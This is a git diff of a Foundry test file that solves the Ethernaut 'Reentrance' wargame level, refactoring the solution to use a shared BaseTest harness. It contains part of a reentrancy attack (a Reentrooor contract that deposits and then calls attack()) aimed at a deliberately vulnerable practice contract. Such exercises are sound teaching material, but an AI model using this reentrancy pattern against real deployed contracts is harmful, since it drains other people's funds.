@@ -1,10 +1,9 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
-import {Test} from "forge-std/Test.sol";
+import {BaseTest} from "./BaseTest.sol";
 import {ReentranceFactory} from "../src/levels/10-ReentranceFactory.sol";
 import {Reentrance} from "../src/levels/10-Reentrance.sol";
-import {Ethernaut} from "../src/core/Ethernaut.sol";
 
 contract Reentrooor {
     Reentrance private target;
@@ -26,41 +25,16 @@ contract Reentrooor {
     }
 }
 
-contract ReentranceSolution is Test {
-    Ethernaut internal ethernaut;
-    address internal attacker = address(1337);
-    ReentranceFactory internal factory;
+contract ReentranceSolution is BaseTest {
 
-    function solution(Reentrance target) internal {
+    function solution(address payable target_) internal override{
+        Reentrance target = Reentrance(target_);
         Reentrooor reentrooor = new Reentrooor(target);
         reentrooor.deposit{value: 0.001 ether}();
         reentrooor.attack();
     }
 
-    function testSolution() public {
-        /////////////////
-        // LEVEL SETUP //
-        /////////////////
-        ethernaut = new Ethernaut();
-        vm.deal(attacker, 1 ether/10);
-
-        factory = new ReentranceFactory();
-        ethernaut.registerLevel(factory);
-        vm.startPrank(attacker);
-        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(factory);
-        Reentrance kingContract = Reentrance(payable(levelAddress));
-
-        //////////////////
-        // LEVEL ATTACK //
-        //////////////////
-
-        solution(kingContract);
-
-        //////////////////////
-        // LEVEL SUBMISSION //
-        //////////////////////
-        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
-        vm.stopPrank();
-        assert(isLevelSuccessfullyPassed);
+    function construction() internal override returns(address payable ) {
+        return payable(address(new ReentranceFactory()));
     }
 }
